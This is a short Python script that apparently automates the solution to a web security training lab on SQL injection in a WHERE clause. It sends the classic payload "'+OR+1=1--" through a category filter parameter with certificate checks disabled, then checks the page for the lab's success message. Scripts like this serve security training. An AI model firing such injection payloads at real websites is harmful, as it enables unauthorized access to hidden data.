import requests
import urllib3
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

LAB_NAME = "SQL injection vulnerability in WHERE clause allowing retrieval of hidden data"

def run(url, payload, proxies=None):
    if url.endswith('/'):
        url = url[:-1]
    payload = "'+OR+1=1--"
    full_url = f"{url}/filter?category={payload}"

    try:
        response = requests.get(full_url, verify=False, proxies=proxies)

        # ✅ If payload is delivered, wait and recheck the main page
        if response.status_code == 200:
            time.sleep(3)  # give the lab some time to register
            home_resp = requests.get(url, verify=False, proxies=proxies)
            return "Congratulations, you solved the lab!" in home_resp.text

    except Exception as e:
        print(f"[!] Error: {e}")

    return False
